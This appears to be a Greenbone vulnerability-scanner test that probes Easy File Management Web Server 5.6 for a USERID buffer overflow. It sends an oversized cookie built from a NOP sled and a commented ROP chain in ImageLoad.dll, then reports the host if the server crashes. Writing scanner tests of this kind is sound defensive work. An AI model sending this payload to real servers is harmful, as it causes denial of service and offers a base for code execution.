# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805096");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2015-08-24 16:20:19 +0530 (Mon, 24 Aug 2015)");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("Easy File Management Web Server USERID Buffer Overflow Vulnerability");

  script_tag(name:"summary", value:"Easy File Management Web Server is prone to a buffer overflow vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET
  and check whether it is able to crash or not.");

  script_tag(name:"insight", value:"The flaw is due to an error when processing
  web requests and can be exploited to cause a buffer overflow via an overly long
  string passed to USERID in a HEAD or GET request.");

  script_tag(name:"impact", value:"Successful exploitation may allow remote
  attackers to cause the application to crash, creating a denial-of-service
  condition.");

  script_tag(name:"affected", value:"Easy File Management Web Server version 5.6");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37808");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("efmws/banner");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");


http_port = http_get_port(default:80);

## product is of low priority
## Detect VT is not required.
kBanner = http_get_remote_headers(port:http_port);
if(!kBanner || "Server: Easy File Management Web Server" >!< kBanner){
  exit(0);
}

## Cross Confirm to avoid FP
if(http_is_dead(port:http_port)){
  exit(0);
}

host = http_host_name(port:http_port);
useragent = http_get_user_agent();
UserID= crap(length:80, data:raw_string(0x90)) +
        raw_string(0xc8, 0xd8, 0x01, 0x10) +  crap(length:280,
        data:raw_string(0x90)) +
        # POP EBX # POP ECX # RETN [ImageLoad.dll]
        # Since 0x00 would break the exploit needs to be crafted on the stack
        # contains 00000000 to pass the JNZ instruction
        # MOV EAX,EBX # POP ESI # POP EBX # RETN [ImageLoad.dll]
        # ADD EAX,5BFFC883 # RETN [ImageLoad.dll] # finish crafting JMP ESP
        # PUSH EAX # RETN [ImageLoad.dll]
        raw_string(0x01, 0x01, 0x01, 0x10,
        0xfb, 0x62, 0x41, 0xa4, 0x25, 0x01, 0x01, 0x10, 0xac, 0x2a,
        0x02, 0x10, 0xef, 0xbe, 0xad, 0xde, 0xef, 0xbe, 0xad, 0xde,
        0x87, 0xa1, 0x01, 0x10, 0x6d, 0x46, 0x02, 0x10) + crap(length:20,
        data:raw_string(0x90)) +raw_string(0x3b, 0x20);

sndReq = 'GET /vfolder.ghp HTTP/1.1\r\n' +
         'Host: ' +  host + '\r\n' +
         'User-Agent: ' + useragent + '\r\n' +
         'Cookie: SESSIONID=1337; UserID=' +  UserID  +'PassWD=' + '\r\n' +
           '\r\n';

rcvRes = http_send_recv(port:http_port, data:sndReq);

if(http_is_dead(port:http_port))
{
  security_message(http_port);
  exit(0);
}
